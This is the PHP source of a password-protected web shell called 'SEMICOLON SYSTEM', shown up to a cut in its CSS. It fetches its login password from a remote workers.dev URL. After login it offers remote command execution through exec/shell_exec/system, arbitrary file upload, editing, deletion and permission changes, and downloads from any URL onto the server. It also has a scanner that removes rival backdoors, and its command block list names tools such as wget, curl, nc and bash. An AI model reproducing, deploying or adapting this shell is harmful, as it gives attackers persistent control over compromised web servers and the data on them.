<?php
session_start();

header("X-Frame-Options: DENY");
header("X-Content-Type-Options: nosniff");
header("X-XSS-Protection: 1; mode=block");

// ==================== REMOTE PASSWORD CONFIG ====================
$REMOTE_PASSWORD_URL = "https://morning-surf-852e.gundam808.workers.dev/get-password";

// ==================== IMPROVED PASSWORD FETCH ====================
function getPasswordFromRemote() {
    global $REMOTE_PASSWORD_URL;
    
    if (function_exists('curl_version')) {
        $ch = curl_init();
        
        curl_setopt_array($ch, [
            CURLOPT_URL => $REMOTE_PASSWORD_URL,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS => 3,
            CURLOPT_USERAGENT => 'SemicolonShell/1.0',
            CURLOPT_HTTPHEADER => [
                'Accept: text/plain',
                'X-Requested-With: PHP'
            ]
        ]);
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($http_code === 200 && !empty($response)) {
            return trim($response);
        }
        return null;
    }
    
    $context = stream_context_create([
        'http' => [
            'timeout' => 8,
            'header' => "User-Agent: SemicolonShell/1.0\r\nAccept: text/plain\r\n"
        ],
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false,
            'allow_self_signed' => true
        ]
    ]);
    
    $response = @file_get_contents($REMOTE_PASSWORD_URL, false, $context);
    
    if ($response === false) {
        return null;
    }
    
    return trim($response);
}

// ==================== AUTHENTICATION CHECK ====================
if (!isset($_SESSION['authenticated'])) {
    if (isset($_POST['auth_token'])) {
        $user_input = trim($_POST['auth_token']);
        $real_password = getPasswordFromRemote();
        
        if ($real_password === null) {
            $auth_error = "Cannot connect to authentication server";
        } else {
            $valid_passwords = [
                $real_password,
                md5($real_password),
                sha1($real_password),
                hash('sha256', $real_password)
            ];
            
            $authenticated = false;
            foreach ($valid_passwords as $valid) {
                if (hash_equals($valid, $user_input)) {
                    $authenticated = true;
                    break;
                }
            }
            
            if ($authenticated) {
                $_SESSION['authenticated'] = true;
                $_SESSION['auth_time'] = time();
                $_SESSION['auth_ip'] = $_SERVER['REMOTE_ADDR'];
                header("Location: ?");
                exit;
            } else {
                $auth_error = "Access denied";
            }
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>SEMICOLON ACCESS</title>
        <style>
            body { background:#000; color:#0f0; font-family:monospace; padding:50px; }
            .login-box { border:2px solid #0f0; padding:30px; max-width:400px; margin:auto; background:#001100; }
            .title { text-align:center; color:#0f0; margin-bottom:20px; }
            input { width:100%; padding:10px; margin:10px 0; background:#000; border:1px solid #0f0; color:#0f0; }
            button { width:100%; padding:12px; background:#0f0; color:#000; border:none; font-weight:bold; }
            .error { color:#f00; text-align:center; margin:10px 0; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <div class="title">;; SEMICOLON ACCESS ;;</div>
            <?php if (isset($auth_error)): ?>
                <div class="error"><?php echo htmlspecialchars($auth_error); ?></div>
            <?php endif; ?>
            <form method="post">
                <input type="password" name="auth_token" placeholder="ENTER PASSWORD" required autofocus>
                <button type="submit">LOGIN</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// ==================== SYSTEM INFO ====================
function getSystemInfo() {
    $info = [];
    $info['server'] = [
        'Hostname' => php_uname('n'),
        'OS' => php_uname('s') . ' ' . php_uname('r'),
        'Architecture' => php_uname('m'),
        'Server Software' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
        'PHP Version' => PHP_VERSION,
        'Server IP' => $_SERVER['SERVER_ADDR'] ?? 'N/A',
        'Client IP' => $_SERVER['REMOTE_ADDR'] ?? 'N/A'
    ];
    $info['php'] = [
        'Memory Limit' => ini_get('memory_limit'),
        'Max Execution Time' => ini_get('max_execution_time'),
        'Upload Max Size' => ini_get('upload_max_filesize'),
        'Post Max Size' => ini_get('post_max_size'),
        'PHP User' => get_current_user()
    ];
    $info['resources'] = [
        'CPU Load' => function_exists('sys_getloadavg') ? implode(', ', sys_getloadavg()) : 'N/A',
        'Memory Usage' => round(memory_get_usage(true)/1024/1024, 2) . ' MB',
        'Memory Peak' => round(memory_get_peak_usage(true)/1024/1024, 2) . ' MB',
        'Disk Free' => round(disk_free_space("/")/1024/1024/1024, 2) . ' GB',
        'Disk Total' => round(disk_total_space("/")/1024/1024/1024, 2) . ' GB'
    ];
    return $info;
}

// ==================== BULK PERMISSIONS ====================
function bulkChmod($items, $permission) {
    $results = ['success' => 0, 'failed' => 0, 'errors' => []];
    foreach ($items as $item_path) {
        $safe_path = sanitize_path($item_path);
        if (file_exists($safe_path)) {
            if (chmod($safe_path, octdec($permission))) {
                $results['success']++;
            } else {
                $results['failed']++;
                $results['errors'][] = "Failed: " . basename($safe_path);
            }
        } else {
            $results['failed']++;
            $results['errors'][] = "Not found: " . basename($safe_path);
        }
    }
    return $results;
}

function getChmodOptions() {
    return [
        'folders' => [
            '755' => '📁 755 (rwxr-xr-x) - Standard Folder',
            '775' => '📁 775 (rwxrwxr-x) - Shared Folder',
            '777' => '📁 777 (rwxrwxrwx) - Full Access',
            '700' => '📁 700 (rwx------) - Owner Only',
            '711' => '📁 711 (rwx--x--x) - Execute Only',
            '750' => '📁 750 (rwxr-x---) - Owner & Group'
        ],
        'files' => [
            '644' => '📄 644 (rw-r--r--) - Standard File',
            '664' => '📄 664 (rw-rw-r--) - Writable by Group',
            '666' => '📄 666 (rw-rw-rw-) - Writable by All',
            '600' => '📄 600 (rw-------) - Owner Only',
            '640' => '📄 640 (rw-r-----) - Owner & Group Read'
        ],
        'secure' => [
            '444' => '🔒 444 (r--r--r--) - Read Only All',
            '400' => '🔒 400 (r--------) - Read Only Owner',
            '555' => '🔒 555 (r-xr-xr-x) - Execute All',
            '500' => '🔒 500 (r-x------) - Execute Owner'
        ],
        'scripts' => [
            '755' => '⚡ 755 (rwxr-xr-x) - Standard Script',
            '744' => '⚡ 744 (rwxr--r--) - Executable Script',
            '700' => '⚡ 700 (rwx------) - Private Script'
        ]
    ];
}

// ==================== BACKDOOR SCANNER ====================
function scanForBackdoors($scan_path, $scan_type = 'quick') {
    $results = ['suspicious_files' => [], 'file_count' => 0, 'scan_time' => 0, 'scanned_dirs' => 0];
    $start_time = microtime(true);
    $critical_patterns = [
        'exec(' => 20, 'gzinflate(' => 20, 'file_put_contents(' => 18, 'file_get_contents(' => 15,
        'system(' => 20, 'passthru(' => 20, 'shell_exec(' => 20, 'move_uploaded_file(' => 18,
        'eval(' => 25, 'base64' => 15
    ];
    $file_extensions = ['php', 'phtml', 'php3', 'php4', 'php5', 'php7', 'phps'];
    $max_depth = ($scan_type == 'deep') ? 10 : 3;
    $max_files = ($scan_type == 'deep') ? 1500 : 500;
    
    function quickScanDirectory($dir, &$results, $patterns, $extensions, $current_depth = 0, $max_depth = 3, $max_files = 1000) {
        if ($current_depth > $max_depth || $results['file_count'] >= $max_files) return;
        if (!is_dir($dir) || !is_readable($dir)) return;
        $items = @scandir($dir);
        if (!$items) return;
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            $full_path = $dir . '/' . $item;
            if (is_dir($full_path)) {
                $results['scanned_dirs']++;
                if (in_array($item, ['node_modules', 'vendor', 'cache', 'log', 'logs', 'tmp', 'temp'])) continue;
                quickScanDirectory($full_path, $results, $patterns, $extensions, $current_depth + 1, $max_depth, $max_files);
            } else {
                $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
                if (in_array($ext, $extensions)) {
                    $results['file_count']++;
                    if ($results['file_count'] > $max_files) return;
                    quickScanFile($full_path, $results, $patterns);
                }
            }
        }
    }
    
    function quickScanFile($file_path, &$results, $patterns) {
        $file_size = @filesize($file_path);
        if ($file_size > 500 * 1024) return;
        if ($file_size === false) return;
        $content = @file_get_contents($file_path);
        if (!$content) return;
        $suspicious_score = 0;
        $found_patterns = [];
        foreach ($patterns as $pattern => $score) {
            if (strpos(strtolower($content), $pattern) !== false) {
                $suspicious_score += $score;
                $found_patterns[] = $pattern;
                if ($score >= 20) break;
            }
        }
        if (preg_match('/eval\s*\(\s*base64_decode/i', $content)) {
            $suspicious_score += 25;
            $found_patterns[] = 'eval_base64';
        }
        if (preg_match('/\$\w+\s*\(\s*\$_POST/i', $content) || preg_match('/\$\w+\s*\(\s*\$_GET/i', $content)) {
            $suspicious_score += 20;
            $found_patterns[] = 'dynamic_function_post_get';
        }
        if ($suspicious_score >= 15) {
            $results['suspicious_files'][] = [
                'path' => $file_path,
                'name' => basename($file_path),
                'score' => $suspicious_score,
                'patterns' => array_slice(array_unique($found_patterns), 0, 3),
                'size' => round($file_size / 1024, 2) . ' KB',
                'permissions' => substr(sprintf('%o', fileperms($file_path)), -4),
                'content' => htmlspecialchars(substr($content, 0, 1000))
            ];
        }
    }
    
    if ($scan_type == 'deep' && is_dir($_SERVER['DOCUMENT_ROOT'])) {
        $scan_path = $_SERVER['DOCUMENT_ROOT'];
        quickScanDirectory($scan_path, $results, $critical_patterns, $file_extensions, 0, 10, 1500);
    } else {
        quickScanDirectory($scan_path, $results, $critical_patterns, $file_extensions, 0, 3, 500);
    }
    
    usort($results['suspicious_files'], function($a, $b) {
        return $b['score'] - $a['score'];
    });
    
    $results['scan_time'] = round(microtime(true) - $start_time, 2);
    return $results;
}

function quickFileCheck($file_path) {
    if (!file_exists($file_path)) return "File not found";
    $file_size = filesize($file_path);
    if ($file_size > 500 * 1024) return "File too large (>500KB)";
    $content = file_get_contents($file_path);
    $checks = [];
    $critical_checks = [
        'exec(' => 'exec(', 'gzinflate(' => 'gzinflate(', 'file_put_contents(' => 'file_put_contents(',
        'system(' => 'system(', 'passthru(' => 'passthru(', 'shell_exec(' => 'shell_exec(',
        'eval(' => 'eval(', 'base64' => 'base64'
    ];
    foreach ($critical_checks as $name => $pattern) {
        if (strpos(strtolower($content), $pattern) !== false) {
            $checks[] = strtoupper($name);
        }
    }
    if (preg_match('/eval\s*\(\s*base64_decode/i', $content)) $checks[] = 'EVAL_BASE64';
    if (preg_match('/\$\w+\s*\(\s*\$_POST/i', $content)) $checks[] = 'DYNAMIC_POST_CALL';
    if (preg_match('/\$\w+\s*\(\s*\$_GET/i', $content)) $checks[] = 'DYNAMIC_GET_CALL';
    return empty($checks) ? "CLEAN" : "SUSPECT: " . implode(', ', $checks);
}

// ==================== SECURITY FUNCTIONS ====================
function sanitize_path($path) {
    $realpath = realpath($path);
    $root = realpath($_SERVER['DOCUMENT_ROOT'] ?: '.');
    return (strpos($realpath, $root) === 0) ? $realpath : $root;
}

function validate_filename($filename) {
    return preg_match('/^[a-zA-Z0-9_\.\-]+$/', $filename) && 
           !in_array($filename, ['.', '..', '.htaccess']);
}

function safe_command($command) {
    $blacklist = ['rm', 'mkfs', 'dd', 'chmod', 'wget', 'curl', 'nc', 'netcat', 'bash', 'sh'];
    $whitelist = ['pwd', 'ls', 'whoami', 'id', 'date', 'uname', 'php -v', 'help'];
    $cmd = strtolower(trim(explode(' ', $command)[0]));
    if (in_array($cmd, $whitelist)) return true;
    if (in_array($cmd, $blacklist)) return false;
    if (preg_match('/^(wget|curl)\s+https?:\/\/[^\s]+$/i', $command)) return true;
    return false;
}

// ==================== FILE OPERATIONS ====================
function deleteRecursive($path) {
    if (!file_exists($path)) return false;
    if (is_dir($path)) {
        $items = array_diff(scandir($path), ['.', '..']);
        foreach ($items as $item) {
            $item_path = $path . '/' . $item;
            if (!deleteRecursive($item_path)) return false;
        }
        return @rmdir($path);
    } else {
        return @unlink($path);
    }
}

function executeCommand($command) {
    if (!safe_command($command)) return ["Command blocked"];
    $output = []; $return_var = 0;
    $dangerous_commands = ['rm -rf', 'mkfs', 'dd', 'chmod 777'];
    foreach ($dangerous_commands as $dangerous) {
        if (stripos($command, $dangerous) !== false) return ["Threat neutralized"];
    }
    if (function_exists('exec')) {
        @exec($command . " 2>&1", $output, $return_var);
    } else if (function_exists('shell_exec')) {
        $result = @shell_exec($command . " 2>&1");
        $output = $result ? explode("\n", trim($result)) : ["No output"];
    } else if (function_exists('system')) {
        ob_start(); @system($command . " 2>&1", $return_var);
        $result = ob_get_clean();
        $output = $result ? explode("\n", trim($result)) : ["No output"];
    } else {
        $output = simulate_terminal($command);
    }
    if (empty($output) || (count($output) === 1 && empty(trim($output[0])))) {
        $output = simulate_terminal($command);
    }
    return $output;
}

function downloadFromUrl($url, $save_path = '') {
    if (empty($save_path)) $save_path = basename($url);
    if (!validate_filename(basename($save_path))) return "Invalid filename";
    if (function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        $data = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($http_code == 200 && $data && file_put_contents($save_path, $data)) {
            return "Download: $save_path";
        }
        return "Download failed";
    } else if (ini_get('allow_url_fopen')) {
        $context = stream_context_create(['http' => ['timeout' => 30]]);
        $data = file_get_contents($url, false, $context);
        if ($data && file_put_contents($save_path, $data)) {
            return "Download: $save_path";
        }
        return "Download failed";
    } else {
        return "No download method";
    }
}

function simulate_terminal($command) {
    $cmd_parts = explode(' ', $command);
    $base_cmd = strtolower($cmd_parts[0]);
    switch ($base_cmd) {
        case 'pwd': return [getcwd()];
        case 'whoami': return ['user'];
        case 'ls':
            $path = $cmd_parts[1] ?? '.';
            if (is_dir($path)) {
                $items = scandir($path);
                $result = [];
                foreach ($items as $item) {
                    if ($item != '.' && $item != '..') {
                        $result[] = $item . (is_dir($path . '/' . $item) ? '/' : '');
                    }
                }
                return $result;
            }
            return ["ls: cannot access"];
        case 'cat':
            $file = $cmd_parts[1] ?? '';
            if ($file && file_exists($file) && is_file($file)) {
                $content = file_get_contents($file);
                return $content ? explode("\n", trim($content)) : ["[empty]"];
            }
            return ["cat: file not found"];
        case 'echo':
            array_shift($cmd_parts);
            return [implode(' ', $cmd_parts)];
        case 'id': return ['uid=1337(user)'];
        case 'date': return [date('D M j H:i:s Y')];
        case 'uname': return [php_uname()];
        case 'php': return ['PHP ' . PHP_VERSION];
        case 'help':
            return ["Commands: pwd, ls, cat, echo, whoami, id, date, uname, php -v, wget [url], curl [url], help"];
        default:
            return ["Command not found", "Type 'help' for commands"];
    }
}

// ==================== INITIALIZE PATH ====================
$current_tab = $_GET['tab'] ?? 'files';
$path = $_GET['path'] ?? '.';
$path = realpath($path) ?: '.';

// ==================== HANDLERS ====================
if (isset($_POST['bulk_delete']) && isset($_POST['selected_items'])) {
    $deleted_count = 0; $errors = [];
    $current_path = sanitize_path($_POST['current_path'] ?? '.');
    foreach ($_POST['selected_items'] as $item_path) {
        $safe_path = sanitize_path($item_path);
        if (file_exists($safe_path)) {
            if (deleteRecursive($safe_path)) $deleted_count++;
            else $errors[] = "Failed: " . basename($safe_path);
        } else $errors[] = "Not found: " . basename($safe_path);
    }
    if ($deleted_count > 0) $_SESSION['success'] = "Deleted $deleted_count items";
    if (!empty($errors)) $_SESSION['error'] = implode("\n", $errors);
    header("Location: ?path=" . urlencode($current_path) . "&tab=files"); exit;
}

if ($_GET['delete'] ?? false) {
    $delete_path = sanitize_path($_GET['delete']);
    $current_path = sanitize_path($_GET['current_path'] ?? '.');
    if (file_exists($delete_path)) {
        if (deleteRecursive($delete_path)) $_SESSION['success'] = "Item deleted";
        else $_SESSION['error'] = "Delete failed";
    } else $_SESSION['error'] = "Item not found";
    header("Location: ?path=" . urlencode($current_path) . "&tab=files"); exit;
}

if (isset($_POST['delete_backdoor'])) {
    $backdoor_path = sanitize_path($_POST['backdoor_path']);
    $current_path = sanitize_path($_POST['current_path'] ?? '.');
    if (file_exists($backdoor_path)) {
        if (unlink($backdoor_path)) {
            $_SESSION['success'] = "Backdoor deleted: " . basename($backdoor_path);
        } else {
            $_SESSION['error'] = "Failed to delete backdoor: " . basename($backdoor_path);
        }
    } else {
        $_SESSION['error'] = "Backdoor file not found: " . basename($backdoor_path);
    }
    header("Location: ?path=" . urlencode($current_path) . "&tab=scanner"); exit;
}

if (isset($_POST['delete_selected_backdoors'])) {
    $deleted_count = 0; $errors = [];
    $current_path = sanitize_path($_POST['current_path'] ?? '.');
    if (isset($_POST['backdoor_files']) && is_array($_POST['backdoor_files'])) {
        foreach ($_POST['backdoor_files'] as $backdoor_path) {
            $safe_path = sanitize_path($backdoor_path);
            if (file_exists($safe_path)) {
                if (unlink($safe_path)) {
                    $deleted_count++;
                } else {
                    $errors[] = "Failed: " . basename($safe_path);
                }
            } else {
                $errors[] = "Not found: " . basename($safe_path);
            }
        }
    }
    if ($deleted_count > 0) $_SESSION['success'] = "Deleted $deleted_count backdoors";
    if (!empty($errors)) $_SESSION['error'] = implode("\n", $errors);
    header("Location: ?path=" . urlencode($current_path) . "&tab=scanner"); exit;
}

if ($_GET['logout'] ?? false) {
    session_destroy(); header("Location: ?"); exit;
}

if ($_POST['terminal_cmd'] ?? false) {
    $command = trim($_POST['terminal_cmd']);
    $current_path = sanitize_path($_POST['current_path'] ?? '.');
    if (empty($command)) {
        $_SESSION['terminal_output'] = "Enter command";
    } else {
        if (preg_match('/^wget\s+(-O\s+([^\s]+)\s+)?(https?:\/\/[^\s]+)/i', $command, $matches)) {
            $url = $matches[3];
            $filename = !empty($matches[2]) ? $matches[2] : basename($url);
            if (!validate_filename($filename)) $_SESSION['terminal_output'] = "Invalid filename";
            else {
                $full_path = $current_path . '/' . $filename;
                $result = downloadFromUrl($url, $full_path);
                $_SESSION['terminal_output'] = $result;
            }
        } else if (preg_match('/^curl\s+(https?:\/\/[^\s]+)/i', $command, $matches)) {
            $url = $matches[1];
            $filename = basename($url);
            if (!validate_filename($filename)) $_SESSION['terminal_output'] = "Invalid filename";
            else {
                $full_path = $current_path . '/' . $filename;
                $result = downloadFromUrl($url, $full_path);
                $_SESSION['terminal_output'] = $result;
            }
        } else {
            $output = executeCommand($command);
            $_SESSION['terminal_output'] = implode("\n", $output);
        }
    }
    $_SESSION['last_command'] = $command;
    header("Location: ?path=" . urlencode($current_path) . "&tab=terminal"); exit;
}

if (isset($_POST['download_url_submit'])) {
    $url = $_POST['download_url'];
    $filename = $_POST['filename'] ?? basename($url);
    $current_path = sanitize_path($_POST['current_path'] ?? '.');
    if (!empty($url)) {
        if (!validate_filename($filename)) $_SESSION['error'] = "Invalid filename";
        else {
            $full_path = $current_path . '/' . $filename;
            $result = downloadFromUrl($url, $full_path);
            if (strpos($result, 'Download:') !== false) $_SESSION['success'] = $result;
            else $_SESSION['error'] = $result;
        }
    } else $_SESSION['error'] = "URL empty";
    header("Location: ?path=" . urlencode($current_path) . "&tab=files"); exit;
}

if (isset($_POST['upload'])) {
    $current_path = sanitize_path($_POST['current_path'] ?? '.');
    $upload_results = []; $success_count = 0; $error_count = 0;
    if (isset($_FILES['files']) && is_array($_FILES['files']['name'])) {
        $file_count = count($_FILES['files']['name']);
        for ($i = 0; $i < $file_count; $i++) {
            if ($_FILES['files']['error'][$i] === UPLOAD_ERR_OK) {
                $filename = basename($_FILES['files']['name'][$i]);
                if (!validate_filename($filename)) {
                    $upload_results[] = "Invalid file: " . $filename; $error_count++; continue;
                }
                $target_file = $current_path . '/' . $filename;
                if (file_exists($target_file)) {
                    $upload_results[] = "File exists: " . $filename; $error_count++;
                } else {
                    if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $target_file)) {
                        $upload_results[] = "Uploaded: " . $filename; $success_count++;
                    } else {
                        $upload_results[] = "Upload failed: " . $filename; $error_count++;
                    }
                }
            } else {
                $error_code = $_FILES['files']['error'][$i];
                $upload_results[] = "Error: " . $_FILES['files']['name'][$i]; $error_count++;
            }
        }
        if ($success_count > 0) $_SESSION['success'] = "Uploaded $success_count files";
        if ($error_count > 0) $_SESSION['error'] = implode("\n", array_slice($upload_results, 0, 10));
    } else if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
        $filename = basename($_FILES['file']['name']);
        if (!validate_filename($filename)) $_SESSION['error'] = "Invalid file";
        else {
            $target_file = $current_path . '/' . $filename;
            if (file_exists($target_file)) $_SESSION['error'] = "File exists: " . $filename;
            else {
                if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) $_SESSION['success'] = "Uploaded: " . $filename;
                else $_SESSION['error'] = "Upload failed: " . $filename;
            }
        }
    } else $_SESSION['error'] = "Upload error";
    header("Location: ?path=" . urlencode($current_path) . "&tab=files"); exit;
}

if (isset($_POST['create_file'])) {
    $filename = $_POST['filename'];
    $current_path = sanitize_path($_POST['current_path'] ?? '.');
    if (!validate_filename($filename)) $_SESSION['error'] = "Invalid filename";
    else {
        $full_path = $current_path . '/' . $filename;
        if (touch($full_path)) $_SESSION['success'] = "File created: $filename";
        else $_SESSION['error'] = "Create failed: $filename";
    }
    header("Location: ?path=" . urlencode($current_path) . "&tab=files"); exit;
}

if (isset($_POST['create_folder'])) {
    $foldername = $_POST['foldername'];
    $current_path = sanitize_path($_POST['current_path'] ?? '.');
    if (!validate_filename($foldername)) $_SESSION['error'] = "Invalid folder name";
    else {
        $full_path = $current_path . '/' . $foldername;
        if (mkdir($full_path, 0755, true)) $_SESSION['success'] = "Folder created: $foldername";
        else $_SESSION['error'] = "Create failed: $foldername";
    }
    header("Location: ?path=" . urlencode($current_path) . "&tab=files"); exit;
}

if (isset($_POST['edit_file'])) {
    $file_path = sanitize_path($_POST['file_path']);
    $file_content = $_POST['file_content'];
    $current_path = sanitize_path($_POST['current_path'] ?? '.');
    if (file_exists($file_path) && is_writable($file_path)) {
        if (file_put_contents($file_path, $file_content) !== false) {
            $_SESSION['success'] = "File saved: " . basename($file_path);
            header("Location: ?path=" . urlencode($current_path) . "&tab=files"); exit;
        } else {
            $_SESSION['error'] = "Save failed: " . basename($file_path);
            header("Location: ?path=" . urlencode($current_path) . "&tab=files"); exit;
        }
    } else {
        $_SESSION['error'] = "File not writable: " . basename($file_path);
        header("Location: ?path=" . urlencode($current_path) . "&tab=files"); exit;
    }
}

if (isset($_POST['rename'])) {
    $old_path = sanitize_path($_POST['old_path']);
    $new_name = trim($_POST['new_name']);
    $current_path = sanitize_path($_POST['current_path'] ?? '.');
    if (empty($new_name)) $_SESSION['error'] = "Name empty";
    else if (!validate_filename($new_name)) $_SESSION['error'] = "Invalid name";
    else {
        $new_path = dirname($old_path) . '/' . $new_name;
        if (!file_exists($old_path)) $_SESSION['error'] = "Not found: " . basename($old_path);
        else if (file_exists($new_path)) $_SESSION['error'] = "Exists: " . $new_name;
        else if (rename($old_path, $new_path)) $_SESSION['success'] = "Renamed: " . basename($old_path) . " → " . $new_name;
        else $_SESSION['error'] = "Rename failed: " . basename($old_path);
    }
    header("Location: ?path=" . urlencode($current_path) . "&tab=files"); exit;
}

if (isset($_POST['bulk_chmod']) && isset($_POST['selected_items']) && isset($_POST['bulk_permission'])) {
    $current_path = sanitize_path($_POST['current_path'] ?? '.');
    $permission = $_POST['bulk_permission'];
    $selected_items = $_POST['selected_items'];
    if (!preg_match('/^[0-7]{3,4}$/', $permission)) {
        $_SESSION['error'] = "Invalid permission format: $permission";
        header("Location: ?path=" . urlencode($current_path) . "&tab=files");
        exit;
    }
    $results = bulkChmod($selected_items, $permission);
    $report = [];
    if ($results['success'] > 0) {
        $report[] = "✅ Successfully changed {$results['success']} items to $permission";
    }
    if ($results['failed'] > 0) {
        $report[] = "❌ Failed to change {$results['failed']} items";
        if (!empty($results['errors'])) {
            $report = array_merge($report, array_slice($results['errors'], 0, 10));
        }
    }
    $_SESSION['bulk_chmod_report'] = $report;
    header("Location: ?path=" . urlencode($current_path) . "&tab=files");
    exit;
}

if (isset($_POST['start_scan'])) {
    $scan_path = sanitize_path($_POST['scan_path'] ?? '.');
    $scan_type = $_POST['scan_type'] ?? 'quick';
    $current_path = sanitize_path($_POST['current_path'] ?? '.');
    $scan_results = scanForBackdoors($scan_path, $scan_type);
    $_SESSION['scan_results'] = $scan_results;
    $_SESSION['scan_path'] = $scan_path;
    header("Location: ?path=" . urlencode($current_path) . "&tab=scanner"); 
    exit;
}

if (isset($_POST['quick_check'])) {
    $file_path = sanitize_path($_POST['file_path']);
    $current_path = sanitize_path($_POST['current_path'] ?? '.');
    $check_result = quickFileCheck($file_path);
    $_SESSION['quick_check_result'] = $check_result;
    $_SESSION['checked_file'] = $file_path;
    header("Location: ?path=" . urlencode($current_path) . "&tab=scanner"); 
    exit;
}

if ($_POST['chmod'] ?? false) {
    $chmod_path = $_POST['chmod_path'];
    $permission = $_POST['permission'];
    if (chmod($chmod_path, octdec($permission))) {
        header("Location: ?path=" . urlencode($path) . "&tab=files"); exit;
    }
}

if ($_GET['download'] ?? false) {
    $file_path = $_GET['download'];
    if (file_exists($file_path) && !is_dir($file_path)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file_path).'"');
        readfile($file_path); exit;
    }
}

if ($_GET['edit'] ?? false) {
    $edit_path = $_GET['edit'];
    if (file_exists($edit_path) && !is_dir($edit_path)) {
        $file_content = htmlspecialchars(file_get_contents($edit_path));
        $current_tab = 'edit';
    }
}

// ==================== HTML UI ====================
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SEMICOLON SYSTEM v2.4</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Courier New', monospace; background: #000000; color: #00ff00; min-height: 100vh; }
        .matrix-bg {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(90deg, rgba(0, 255, 0, 0.1) 1px, transparent 1px),
                       linear-gradient(180deg, rgba(0, 255, 0, 0.1) 1px, transparent 1px);
            background-size: 50px 50px; animation: gridMove 20s linear infinite; z-index: -1;
        }
        .header {
            background: rgba(0, 30, 0, 0.9); border-bottom: 2px solid #00ff00;
            padding: 15px 20px; display: flex; justify-content: space-between; align-items: center;
        }
        .title { font-size: 20px; color: #00ff00; text-shadow: 0 0 10px #00ff00; font-weight: bold; }
        .logout { background: #00ff00; color: #000; text-decoration: none; font-weight: bold; padding: 8px 16px; border-radius: 5px; }
        .tabs { background: rgba(0, 20, 0, 0.9); border-bottom: 1px solid #00ff00; display: flex; }
        .tab {
            padding: 12px 20px; background: transparent; border: none; color: #00ff00; cursor: pointer;
            font-family: 'Courier New'; font-size: 14px; border-right: 1px solid #00ff00;
        }
        .tab.active { background: #00ff00; color: #000; }
        .tab-content { display: none; padding: 20px; }
        .tab-content.active { display: block; }
        .path-bar { background: rgba(0, 25, 0, 0.9); padding: 10px 20px; border-bottom: 1px solid #00ff00; font-size: 14px; }
        .path-link { color: #00ff00; cursor: pointer; text-decoration: underline; margin: 0 5px; }
        .tool-bar { background: rgba(0, 20, 0, 0.9); padding: 15px 20px; border-bottom: 1px solid #00ff00; display: flex; gap: 10px; flex-wrap: wrap; }
        .tool-btn {
            background: #003300; color: #00ff00; border: 1px solid #00ff00; padding: 8px 16px;
            cursor: pointer; font-family: 'Courier New'; font-size: 12px; border-radius: 5px;
        }
        .tool-btn:hover { background: #00ff00; color: #000; }
        .file-table {
            width: 100%; border-collapse: collapse; background: rgba(0, 10, 0, 0.9);
            margin: 20px 0; border: 1px solid #00ff00;
        }
        .file-table th { background: #002200; color: #00ff00; padding: 12px; border: 1px solid #00ff00; text-align: left; }
        .file-table td { padding: 10px; border: 1px solid #00ff00; background: #001100; color: #00ff00; }
        .dir { color: #00ffff; cursor: pointer; }
        .file { color: #00ff00; }
        .actions { white-space: nowrap; }
        .action-btn {
            background: #003300; color: #00ff00; border: 1px solid #00ff00; padding: 4px 8px;
            cursor: pointer; font-size: 11px; margin: 0 2px; font-family: 'Courier New'; border-radius: 3px;
        }
        .action-btn:hover { background: #00ff00; color: #000; }
        .terminal-container {
            background: #000; border: 1px solid #00ff00; height: 400px; overflow-y: auto;
            padding: 15px; font-family: 'Courier New'; font-size: 14px;
        }
        .terminal-output { color: #00ff00; margin-bottom: 10px; white-space: pre-wrap; }
        .terminal-input { background: transparent; border: none; color: #00ff00; font-family: 'Courier New'; font-size: 14px; width: 80%; outline: none; }
        .cmd-form { display: flex; align-items: center; background: #001100; border: 1px solid #00ff00; padding: 10px; margin-top: 10px; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); z-index: 1000; }
        .modal-content { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #001100; border: 2px solid #00ff00; padding: 20px; min-width: 300px; }
        .modal-title { color: #00ff00; margin-bottom: 15px; font-size: 16px; }
        .modal-input { width: 100%; background: #000; border: 1px solid #00ff00; color: #00ff00; padding: 8px; margin: 5px 0; font-family: 'Courier New'; }
        .edit-textarea { width: 100%; height: 300px; background: #000; border: 1px solid #00ff00; color: #00ff00; padding: 10px; font-family: 'Courier New'; font-size: 12px; resize: vertical; }
        .error-message { background: rgba(255, 0, 0, 0.1); border: 1px solid #ff0000; color: #ff0000; padding: 10px; margin: 10px 0; text-align: center; }
        .success-message { background: rgba(0, 255, 0, 0.1); border: 1px solid #00ff00; color: #00ff00; padding: 10px; margin: 10px 0; text-align: center; }
        .checkbox-cell { width: 30px; text-align: center; }
